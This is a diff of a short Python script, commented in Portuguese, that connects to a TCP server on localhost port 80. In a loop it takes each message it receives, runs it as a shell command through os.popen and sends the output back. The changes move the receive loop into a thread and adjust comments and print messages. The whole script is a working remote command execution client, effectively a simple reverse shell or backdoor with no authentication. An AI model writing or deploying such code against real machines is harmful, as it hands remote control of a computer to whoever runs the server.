@@ -1,20 +1,22 @@
 import socket
 import os
+import threading
 
 def main():
     #criando socket tcp
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        #conectando na porta 80 em localhost
+        #conectando
         client.connect(('localhost', 80))
     except:
         #sai do programa se não tiver conectado (quer dizer que a porta ou o host não esta aberta/existe)
-        return print('\nNão foi possível conectar ao servidor.')
+        return print('\n Não foi possível conectar ao servidor.')
 
     print('\nConectado!')
 
     #recebe as mensagens do servidor
-    receiveMessages(client)
+    thread = threading.Thread(target=receiveMessages, args=[client])
+    thread.start()
 
 #função que recebe as mensagens no servidor e executa no shell
 def receiveMessages(client):
@@ -28,11 +30,9 @@ def receiveMessages(client):
             with os.popen(msg, "r") as response:
                 #envia para o servidor o conteúdo guardado na variavel response
                 client.send(response.read().strip().encode())    
-            #continua o loop
-        
+        #continua o loop
         except Exception as ex:
             print(f'\n Não foi possível permanecer conectado no servidor por: {str(ex)}.\n')
-            print('Pressione <Enter> para continuar...')
             client.close()
             break
 main()
